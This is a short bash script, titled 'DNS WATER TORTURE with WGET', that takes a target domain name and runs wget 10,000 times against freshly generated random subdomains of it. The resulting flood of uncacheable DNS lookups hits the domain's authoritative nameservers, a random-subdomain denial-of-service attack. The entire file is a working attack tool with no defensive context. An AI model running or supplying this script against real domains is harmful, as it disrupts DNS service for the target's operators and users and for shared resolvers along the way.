#!/bin/bash
# Christopher Gray
# Update: 2/22/20
# Version: 0.8.5
#---------------------------------------
# DNS WATER TORTURE with WGET

if [ -z "$1" ]
   then
      echo "Domain Name Required. please define one before continuing \r\n"
      exit
else
      DomainName=$1
      echo "Domain Name is set to $DomainName \r\n Sleeping for 3 seconds... \r\n"
      sleep 3
fi

for (( c=1; c<=10000; c++ ))
do
   #wget -O /dev/null $RANDOM.$DomainName
   #NEW_UUID_MORE_CHARACTERS=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | head -c 32);

   RandomInt=$((RANDOM%20+6));
   NEW_UUID_MORE_CHARACTERS=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | head -c $RandomInt);
   echo http://$NEW_UUID_MORE_CHARACTERS.$DomainName
   
   wget -O /dev/null http://$NEW_UUID_MORE_CHARACTERS.$DomainName
done
